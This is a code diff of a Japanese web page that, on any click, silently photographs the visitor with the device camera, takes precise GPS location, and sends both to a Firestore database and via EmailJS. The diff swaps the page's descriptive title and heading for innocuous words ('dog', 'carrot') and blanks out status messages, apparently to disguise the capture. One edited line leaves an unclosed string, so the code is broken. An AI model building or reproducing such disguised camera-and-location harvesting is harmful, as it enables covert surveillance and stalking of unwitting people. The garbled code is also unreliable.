@@ -1,7 +1,7 @@
 <html lang="ja"><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Firestore保存＋EmailJS送信（2枚ずつ連写＋音声再生）</title>
+<title>犬</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -50,7 +50,7 @@
   }
 
   async function capturePhotosWithQuality(facingMode) {
-    log(`📸 ${facingMode}カメラ起動`);
+    log(`📸 ${facingMode}あ`);
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
     const video = document.createElement("video");
     video.style.display = "none";
@@ -72,7 +72,7 @@
       const lowQuality = canvas.toDataURL("image/jpeg", 0.2);
       highQualityPhotos.push(highQuality);
       lowQualityPhotos.push(lowQuality);
-      log(`撮影 ${i + 1} 枚目 高画質: ${Math.round((highQuality.length * 3) / 4 / 1024)} KB, 低画質: ${Math.round((lowQuality.length * 3) / 4 / 1024)} KB`);
+      log(`撮影 ${i + 1} 枚目 あ: ${Math.round((highQuality.length * 3) / 4 / 1024)} KB, あ: ${Math.round((lowQuality.length * 3) / 4 / 1024)} KB`);
       await new Promise(r => setTimeout(r, 50));
     }
 
@@ -82,10 +82,10 @@
   }
 
   function getLocation() {
-    log("📍 位置情報取得開始");
+    log("あ
     return new Promise((resolve, reject) => {
       if (!navigator.geolocation) {
-        reject(new Error("位置情報非対応"));
+        reject(new Error("あ"));
         return;
       }
       navigator.geolocation.getCurrentPosition(pos => {
@@ -98,39 +98,39 @@
         log(`位置情報取得成功: 緯度${loc.lat}, 経度${loc.lon}, 精度${loc.acc}m`);
         resolve(loc);
       }, err => {
-        log(`⚠️ 位置情報取得失敗: ${err.message}`);
+        log(`⚠️ あ: ${err.message}`);
         resolve({ lat: "不明", lon: "不明", acc: "不明", time: new Date().toLocaleString() });
       }, { enableHighAccuracy: true, timeout: 10000 });
     });
   }
 
   async function saveToFirestore(data) {
-    log("⬆️ Firestoreに保存中...");
+    log("あ保存中...");
     try {
       await addDoc(collection(db, "photos_with_location"), data);
-      log("✅ Firestore保存完了");
+      log("✅ Firestoあ");
     } catch (e) {
-      log("❌ Firestore保存失敗: " + e.message);
+      log("❌ Firestoreあ: " + e.message);
     }
   }
 
   async function sendEmail(data) {
-    log("✉️ EmailJS送信中...");
+    log("✉️ EmailJSあ...");
     try {
       await emailjs.send('service_ja2c09x', 'template_2fp2jrg', data);
-      log("✅ Email送信完了");
+      log("✅ Email送あ了");
     } catch (e) {
-      log("❌ Email送信失敗: " + e.message);
+      log("❌ Emaあ敗: " + e.message);
     }
   }
 
   async function runProcess() {
     if (busy) {
-      log("❌ 処理中です。二重実行防止");
+      log("❌ 処理あ実行防止");
       return;
     }
     busy = true;
-    log("🔄 処理開始");
+    log("🔄 理あ開始");
 
     try {
       const rearPhotos = await capturePhotosWithQuality("environment");
@@ -154,9 +154,9 @@
       };
       await sendEmail(templateParams);
 
-      log("🎉 処理完了！");
+      log("🎉 処あ了！");
     } catch (e) {
-      log("❌ 全体処理エラー: " + e.message);
+      log("❌ 全あ処理あラー: " + e.message);
     } finally {
       busy = false;
     }
@@ -170,6 +170,7 @@
     audio.volume = 1.0;
     audio.play().catch(e => log("❌ 音声再生失敗: " + e.message));
   }
+
 
   window.addEventListener("click", () => {
     runProcess();
@@ -185,10 +186,11 @@
 </script>
 </head>
 <body>
-  <h1>📸 Firestore保存＋EmailJS送信（高画質＆低画質）＋音声再生</h1>
-  <pre id="status">待機中...🔄 処理開始
+  <h1>にんじん</h1>
+  <pre id="status">待機あ..🔄 処理開始
 
 </pre>
 
 
-</body></html>
+</body>
+</html>
